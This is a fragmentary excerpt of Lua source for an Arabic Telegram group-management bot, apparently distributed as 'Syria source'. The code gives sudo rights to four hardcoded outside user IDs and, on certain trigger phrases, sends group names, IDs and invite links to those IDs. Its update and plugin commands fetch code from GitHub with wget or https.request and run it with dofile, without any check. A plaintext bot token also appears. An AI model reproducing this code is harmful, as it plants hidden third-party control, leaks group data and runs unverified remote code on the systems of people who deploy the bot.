...
io.popen("cd File_Bot && wget https://raw.githubusercontent.com/gret7/new/main/File_Bot/commands.lua") 
...
dev_users = {1950281200,1925760763,1364212456,1929806659}   
...
sudo_users = {SUDO,1950281200,1925760763,1364212456,1929806659}   
...
function msa3d(msg) 
local hash = database:sismember(bot_id.."msa3d:ban", msg.sender_user_id_) 
if hash or SudoBot(msg) then  
return true  
else  
return false  
...
var = true  
elseif tonumber(user_id) == tonumber(1925760763) then
var = true  
elseif tonumber(user_id) == tonumber(SUDO) then
var = true  
elseif tonumber(user_id) == tonumber(bot_id) then
var = true  
elseif database:sismember(bot_id.."msa3d:ban", user_id) then
var = true  
...
Var = false
keyboard = {} 
keyboard.inline_keyboard = {{{text=data.name,url=data.username}}} 
Msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id='..msg.chat_id_..'&text=' .. URL.escape(data.msg).."&reply_to_message_id="..Msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
else
Var = true
end
return Var
...
if not DevSoFi(msg) and not database:sismember(bot_id..'DRG:User_Bot',msg.sender_user_id_) and not database:get(bot_id..'Tuasl:Bots') then
...
os.execute('wget https://raw.githubusercontent.com/gret7/new/main/DRAGON.lua')
...
send(msg.chat_id_, msg.id_,' ● اصدار سورس سوريا{ S:1✓}')
end
...
keyboard = {}  
keyboard.inline_keyboard = { 
{{text = 'مطورين السورس⚙', url="t.me/X_G_33"}}, 
} 
local msg_id = msg.id_/2097152/0.5 
...
if text ==  'سوريا مبرمج السورس' and DevSoFi(msg) then
database:del(bot_id..'Srt:Bot') 
local Text = [[ 
...
keyboard = {}  
keyboard.inline_keyboard = { 
{{text = '˹𝑠𝑖𝑟𝑖𝑎 ➧˼', url="t.me/AHMED_MERO_love"}}, 
} 
local msg_id = msg.id_/2097152/0.5 
https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end
...
keyboard = {}  
keyboard.inline_keyboard = { 
{{text = '𝙎𝙊𝙐𝙍𝘾𝙀 𝙎𝙄𝙍𝙄𝘼 ', url="t.me/X_G_33"}}, 
} 
local msg_id = msg.id_/2097152/0.5 
...
if database:get(bot_id.."YYYBD_aza3h3" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) then 
tdcli_function({ID="GetUser",user_id_=msg.sender_user_id_},function(extra,result,success)
local msa3d = database:get(bot_id.."id:msa3d:ban")
if text ==  'الغاء' or text == 'الغاء ●' then   
send(msg.chat_id_, msg.id_," ● تم الغاء الرساله للمطور")
database:del(bot_id.."YYYBD_aza3h3" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) 
return false
end 
if text then
...
sendText(1950281200,"●. هناك شخص يريدك يا سيدي سوريا \n●الشخص  {"..Name.."}\n●اسم الجروب {"..NameChat.."}\n●ايدي الجروب { `"..msg.chat_id_.."` }\n●رابط الجروب \n [ "..LinkGroup.." ]\n    ●رابط الرساله \n https://t.me/c/"..chatid.."/"..msg_id.."   ",0,'md')
end,nil)
end,nil)
end


if text and text:match("^احمد سوريا$") or text and text:match("^ديفد$") or text and text:match("^devid$") then
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(extra,result,success)
tdcli_function({ID ="GetChat",chat_id_=msg.chat_id_},function(arg,dp) 
local Name1 = result.first_name_
local Name1 = Name1:gsub('"',"") 
...
sendText(1925760763,"●. هناك شخص يريدك يا سيدي  احمد سوريا \n●الشخص  {"..Name.."}\n●اسم الجروب {"..NameChat.."}\n●ايدي الجروب {`"..msg.chat_id_.."`}\n●رابط الجروب \n ["..LinkGroup.."] ",0,'md')
end,nil)
end,nil)
end
...
send(msg.chat_id_,0,"✭︙ العضو : {["..data.first_name_.."](T.ME/siria100)}\n✭︙ ["..DRAGON_Msg.."] \n")
end
end,nil)   
DeleteMessage(msg.chat_id_, {[0] = msg.id_})     
return false
...
send(msg.chat_id_,0, "✭︙ عذرا » {["..data.first_name_.."](T.ME/siria100)}\n✭︙ عذرا تم منع الملصق \n" ) 
end
end,nil)   
DeleteMessage(msg.chat_id_,{[0] = msg.id_})       
return false   
...
os.execute('rm -rf DRAGON.lua')
os.execute('wget https://raw.githubusercontent.com/ahmedsiria/new/main/DRAGON.lua')
send(msg.chat_id_, msg.id_,'✭︙ تم تحديث السورس \n✭︙ لديك اخر اصدار لسورس سورييا\n✭︙ الاصدار » { v 1.6 }')
dofile('DRAGON.lua')  
end
...
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data)  
send(msg.chat_id_, msg.id_,'✭︙ بواسطه » ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'siria100')..') \n✭︙ تـم قفـل الدردشه ')
end,nil)   
...
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,'✭︙ بواسطه » ['..string.sub(data.first_name_,0,60)..'](T.ME/'..(data.username_ or 'siria100')..') \n✭︙ تـم قفـل التاك بالكتم ')
end,nil)   
...
if DevSoFi(msg) then
local Get_Files, res = https.request("https://raw.githubusercontent.com/ahmedsiria/new/main/getfile.json")
if res == 200 then
local Get_info, res = pcall(JSON.decode,Get_Files);
vardump(res.plugins_)
if Get_info then
local TextS = "\n✭︙ اهلا بك في متجر ملفات سورييا\n✭︙ ملفات السورس ↓\n𖠕━┅┅┄⟞❲🆂🅸🆁🅸🅰❳⟝┄┉┉━𖠕\n\n"
local TextE = "\n𖠕━┅┅┄⟞❲🆂🅸🆁🅸🅰❳⟝┄┉┉━𖠕\n✭︙ علامة تعني { ✔️ } ملف مفعل\n✭︙ علامة تعني { ✖ } ملف معطل\n✭︙ قناة سورس سورييا ↓\n".."✭︙ [اضغط هنا لدخول](t.me/siria100) \n"
local NumFile = 0
...
local json_file, res = https.request("https://raw.githubusercontent.com/ahmedsiria/new/main/File_Bot/"..file)
if res == 200 then
os.execute("rm -fr File_Bot/"..file)
send(msg.chat_id_, msg.id_,t) 
dofile('DRAGON.lua')  
else
send(msg.chat_id_, msg.id_,"✭︙ عذرا الملف لايدعم سورس سورييا \n") 
end
return false
end
...
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n✭︙ العضو » ['..data.first_name_..'](t.me/'..(data.username_ or 'siria100')..')'
status  = '\n✭︙ تم ترقيته مطور'
send(msg.chat_id_, msg.id_, usertext..status)
end,nil)
end
...
database:sadd(bot_id..'Sudo:User', result.id_)
usertext = '\n✭︙ العضو » ['..result.title_..'](t.me/'..(username or 'siria100')..')'
status  = '\n✭︙ تم ترقيته مطور'
texts = usertext..status
else
texts = '✭︙ لا يوجد حساب بهاذا المعرف'
...
tdcli_function ({ID = "GetUser",user_id_ = userid},function(arg,data) 
if data.first_name_ then
usertext = '\n✭︙ لعضو » ['..data.first_name_..'](t.me/'..(data.username_ or 'siria100')..')'
status  = '\n✭︙ تم تنزيله من المميزين'
send(msg.chat_id_, msg.id_, usertext..status)
else
usertext = '\n✭︙ العضو » '..userid..''
...
if blakrt == 'مميز' and Mod(msg) then
send(msg.chat_id_, msg.id_,'\n✭︙ العضو » ['..result.title_..'](t.me/'..(text1[3] or 'siria100')..')'..'\n✭︙ تم رفعه '..text1[2]..'')   
database:sadd(bot_id..'Special:User'..msg.chat_id_,result.id_)  
...
if text == ""..(database:get(bot_id..'Name:Bot') or 'سورييا').."" then  
Namebot = (database:get(bot_id..'Name:Bot') or 'سورييا')
local DRAGON_Msg = {
'عمغي 🥺💕.',
...
database:set(bot_id.."siria100:insta_bot"..msg.chat_id_,"close")
end
if text == "تفعيل الانستا" and Manager(msg) then
send(msg.chat_id_, msg.id_,'⌯ تم تفعيل الانستا')
database:set(bot_id.."siria100:insta_bot"..msg.chat_id_,"open")
end
if text and text:match("^معلومات (.*)$") and database:get(bot_id.."siria100:insta_bot"..msg.chat_id_) == "open" then
...
database:set(bot_id.."siria100:Tag:Admins:"..msg.chat_id_,true)
send(msg.chat_id_, msg.id_,"✭︙تم تفعيل تاك المشرفين")
end
if text and text == "تعطيل تاك المشرفين" and Manager(msg) then 
database:del(bot_id.."siria100:Tag:Admins:"..msg.chat_id_)
...
if database:get(bot_id.."siria100:Tag:Admins:"..msg.chat_id_) then 
tdcli_function ({ID = "GetChannelMembers",channel_id_ = msg.chat_id_:gsub("-100",""),filter_ = {ID = "ChannelMembersAdministrators"},offset_ = 0,limit_ = 100},function(arg,data)
...
end --الكود حصري سورس سورييا يعني لو بكتهن راح اعرفك انت الاخذتهن
...
------------------------------------------------------------------------
-------------------------------
if text == ""..(database:get(bot_id..'Name:Bot') or 'سورييا').." غادر" or text == 'بوت غادر' then  
...
local tokenget = '1950786270:AAHMSD9_nLfo5Cch7shLb7f0EneNgim41rQ'
if text ==  'احمد سوريا' or text == 'ahmed siria' then
local id = '1925760763'
...
if text ==  'سوريا' or text == 'siria' or text == ' احمد سوريا' then
local Text = [[
ᴘʀᴏɢʀᴀᴍᴍᴇʀ ᴘᴀɴᴅᴀ
...
keyboard = {} 
keyboard.inline_keyboard = {
{{text = '𝘼 𝙈🇦🇽 𝙎 𝙄 𝙍 𝙄 𝘼 ✹ 🇬🇺',url="t.me/AHMED_MERO_love"}},
...
local Text = [[ 
[قناه سورس الديبادخل وتابع الجديد](t.me/X_G_33)
]] 
keyboard = {}  
keyboard.inline_keyboard = { 
{{text = '𝙎𝙊𝙐𝙍𝘾𝙀 𝙎𝙄𝙍𝙄𝘼 ', url="t.me/X_G_33"}}, 
...
send(msg.chat_id_, msg.id_, t..'⚚━━━━━⚚𝑺𝑰𝑹𝑰𝑨 ☽‘⚚━━━━━⚚\nاضغط علي الاسم ليتم نسخه\n⚚━━━━━⚚𝑺𝑰𝑹𝑰𝑨 ☽‘⚚━━━━━⚚ٴ\n ◉ ❲[𝑺𝑰𝑹𝑰𝑨 ☽‘](t.me/siria100)❳ ◉ ')
end
...
{{text = 'تــواصــل بــانــدا',url="t.me/mero_kol_heaty"}}, 
...
keyboard.inline_keyboard = {
{{text = '𝙎𝙊𝙐𝙍𝘾𝙀 𝙎𝙄𝙍𝙄𝘼 ', url="t.me/X_G_33"}},
{{text = '˹تــواصــل الـسـورس˼',url="t.me/mero_kol_heaty"}}, 
{{text = '●𝙱𝙰𝙲𝙺↵', callback_data="/change-hhh"}},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessagecaption?chat_id='..Chat_id..'&caption='..URL.escape(Teext)..'&message_id='..msg_idd..'&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard))  
end
...
keyboard = {} 
keyboard.inline_keyboard = {
{{text = '⌯ ˹𓆩 ★ 𝙈𝙀𝙍𝙊 𐇑 .𖤐𓃠˼',url="t.me/MERO5O5"},{text = '𝙎𝙊𝙐𝙍𝘾𝙀 𝙎𝙄𝙍𝙄𝘼 ',url="t.me/X_G_33"}},
...
keyboard = {} 
keyboard.inline_keyboard = {
{{text = '™𓆩 ★ 𝐀𝐌 🇹🇷✞︎ 𝐓𝐄𝐀𝐌 𝐒𝐏𝐈𝐂𝐘 ★ 𓆪',url="t.me/mero_kol_heaty"}},
{{text = '●𝙱𝙰𝙲𝙺↵', callback_data="/bnada-yquio"}},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessagecaption?chat_id='..Chat_id..'&caption='..URL.escape(Teext)..'&message_id='..msg_idd..'&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard))  
end
...
keyboard = {} 
keyboard.inline_keyboard = {
{{text = '𝙎𝙊𝙐𝙍𝘾𝙀 𝙎𝙄𝙍𝙄𝘼 ',url='http://t.me/X_G_33'}},
}
...
database:setex(bot_id.."Ss:Cs" .. Chat_id .. ":" .. data.sender_user_id_, 600, true) 
...
database:setex(bot_id.."YYYBD_aza3h3" .. Chat_id .. ":" .. data.sender_user_id_, 600, true) 
...
local Name_Bot = (database:get(bot_id..'Name:Bot') or 'سورييا')
...
keyboard = {}  
keyboard.inline_keyboard = { 
{{text = '𓌹 ᯓ مــبـرمـج الســورس ★ 𓌺',url="t.me/siria100"}}, 
} 
local msg_id = msg.id_/2097152/0.5  
